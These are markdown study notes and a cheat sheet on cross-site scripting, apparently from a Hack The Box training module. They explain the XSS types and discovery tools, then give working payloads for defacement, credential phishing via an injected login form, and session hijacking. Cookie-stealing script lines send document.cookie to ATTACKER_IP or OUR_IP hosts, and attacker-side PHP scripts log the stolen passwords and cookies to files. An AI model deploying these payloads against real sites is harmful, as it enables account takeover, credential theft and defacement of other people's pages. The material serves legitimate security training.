# <a id="top-of-page"></a> Cross-site Scripting (XSS)

### Links

- [Command Cheetsheet](#cmd-cheet)
- [General XSS Information](#gen-xss)
  - [Stored XSS](#stor-xss)
  - [Reflected XSS](#ref-xss)
  - [DOM XSS](#dom-xss)
  - [XSS Discovery](#disc-xss)
- [XSS Attacks](#xss-att)
  - [Defacing](#deface)
  - [Phishing](#phish)
  - [Session Hijacking](#sess-hijack)

# <a id="cmd-cheet"></a> Command Cheetsheet

| Code                                                                                          | Description                   |
| --------------------------------------------------------------------------------------------- | ----------------------------- |
| **XSS Payloads**                                                                              |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload             |
| `<plaintext>`                                                                                 | Basic XSS Payload             |
| `<script>print()</script>`                                                                    | Basic XSS Payload             |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload        |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color       |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image       |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title          |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element   |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script            |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us     |

[Back to top](#top-of-page)

</br>

# <a id="gen-xss"></a> General XSS Information

One of the most common types of web application vulnerabilities are Cross-Site Scripting (XSS) vulnerabilities. XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.

## <a id="stor-xss"></a> -Stored XSS-

This is the most critical types of XSS vulnerability as payloads are injected and stored in the back-end databases to be executed whenever the page is retrieved. When a payload is stored in the DB, it may not be a simple task of removing it.

## <a id="ref-xss"></a> -Reflected XSS-

Reflected XSS vulnerabilities occur when malicious input reaches the back-end server and gets returned to to the user without being filtered or sanitized. These are Non-Persistant attacks, that require additional steps to be exploited for an end-user (phishing), and generally GET requests are the easiest to phish with.

## <a id="dom-xss"></a> -DOM XSS-

While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS is also Non-Persistant and occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

To understand DOM-based XSS vulnerabilities, the concept of the Source and Sink of the object must be understood. The Source is the JS object that takes the user input, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack.

Common JS function to write to DOM objects:

- document.write()
- DOM.innerHTML
- DOM.outerHTML

Common jQuery library functions that write to DOM objects:

- add()
- after()
- append()

If the Sink function writes the exact input with sanitization, than the page should be vulnerable.

_Example of vulnerable code_

```
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

## <a id="disc-xss"></a> -XSS Discovery-

### --Automated Disovery--

OPS Tools:

- [XSS Strike](https://github.com/s0md3v/XSStrike)
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)

Web App Vul Scanners:

- [Nessus](https://www.tenable.com/products/nessus)
- [Burp Pro](https://portswigger.net/burp/pro)
- [ZAP](https://owasp.org/www-project-zap/)

### --Manual Discovery--

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)
- Code Review

**_Blind Injection_**
When checking for Blind XSS, there is a need to set up netcat listener and PHP local server to catck a backend call. With Blind XSS there is no visible output on the page, so forcing the page to try and load a remote resource with an attacker controlled endpoint will reveal the vulnerability.

This payload should be input into all text input fields available to test for the Blind XSS.

- [PayloadAllTheThings (loading remote script)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)

_Example Payload_

```
<script src="http://ATTACKER_IP/username"></script>
```

[Back to top](#top-of-page)

</br>

# <a id="xss-att"></a> XSS Attacks

## <a id="deface"></a> -Defacing-

One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks, which usually leverages Stored XSS vulnerability.

Three HTML elements are usually utilized to change the main look of a web page:

- Background Color document.body.style.background
- Background document.body.background
- Page Title document.title
- Page Text DOM.innerHTML

An attacker can utilize two or three of these elements to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page.

Example below:

_Change Background_

```
Set a bg color
<script>document.body.style.background = "#141d2b"</script>

Set a bg image
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

_Change Page Title_

```
<script>document.title = 'TEST'</script>
```

_Change Page Text_

```
Change text of specific element/DOM
document.getElementById("todo").innerHTML = "New Text"

Change multiple elements using jQuery library (must be imported within page source)
$("#todo").html('New Text');

Change entire HTML code of main body using minified alt HTML code
document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Example Attack</h1><p style="color: white">by <img src="https://example.com/images/logo.svg" height="25px" alt="TEST"> </p></center>'
```

## <a id="phish"></a> -Phishing-

### --Login Form Injection--

This attack will try and convince a target to enter their creds on a screen using a Reflected XSS vulnerability with a GET request.

_Basic HTML Login Form_

```
<h3>Please login to continue</h3>
<form action=http://ATTACKER_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

_XSS payload for Login Form_

```
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

_Use this element to remove unwanted elements_

```
document.getElementById('urlform').remove();
```

_Example updated XSS payload with unwanted element removal_

```
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

_Set up local PHP server_

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```
Anon4Now@ATTACKER[/home]$ mkdir /tmp/tmpserver
Anon4Now@ATTACKER[/home]$ cd /tmp/tmpserver
Anon4Now@ATTACKER[/tmp/tmpserver]$ vi index.php #at this step write index.php file
Anon4Now@ATTACLER[/tmp/tmpserver]$ sudo php -S 0.0.0.0:80
```

## <a id="sess-hijack"></a> -Session Hijacking-

A session hijacking attack is very similar to the phishing attack performed in the previous section. It requires a JavaScript payload to send the attacker the required data and a PHP script hosted on an attacker server to grab and parse the transmitted data.

- [PayloadAllTheThings (session hijacking)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)

_Write the payload to local script.js file_

```
new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;
```

_Start attacker controlled PHP server_

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```
Anon4Now@ATTACKER[/home]$ mkdir /tmp/tmpserver
Anon4Now@ATTACKER[/home]$ cd /tmp/tmpserver
Anon4Now@ATTACKER[/tmp/tmpserver]$ vi index.php #at this step write index.php file
Anon4Now@ATTACLER[/tmp/tmpserver]$ sudo php -S 0.0.0.0:80
```

_XSS script injection on victim page_

```
<script src=http://ATTACKER_IP/script.js></script>
```

[Back to top](#top-of-page)

</br>
